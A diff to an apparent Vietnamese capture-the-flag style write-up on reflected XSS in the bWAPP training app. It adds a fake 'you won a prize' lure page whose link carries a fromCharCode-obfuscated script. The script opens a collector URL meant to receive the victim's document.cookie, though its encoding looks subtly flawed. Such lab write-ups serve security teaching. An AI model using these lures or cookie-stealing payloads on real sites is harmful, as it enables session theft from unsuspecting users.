@@ -17,4 +17,19 @@ Vậy là xác định trang web có dính XSS
 
 ### Khai thác
 
-Tương tự như case Low, ta encode 
+Sử dụng lại file get.php và index.php case Low.
+
+file index.php sửa lại như sau
+```java script
+<html>
+<head>
+<title>Lottery hihi</title>
+</head>
+<body>
+	<h1 align="center">CONGRATULATIONS!!!</h1>
+	<h1 align="center">YOU WON!!!</h1>
+	Click this <a href="http://localhost/bwapp/xss_get.php?firstname=<script>window.open(String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 108, 111, 99, 97, 108, 104, 111, 115, 116, 47, 103, 101, 116, 46, 112, 104, 112, 63, 99, 111, 111, 107, 105, 101, 61, 34, 43, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101))</script>&lastname=a&form=submit">link</a> to see your prize
+</body>
+</html>
+```
+Còn lại làm tương tự.
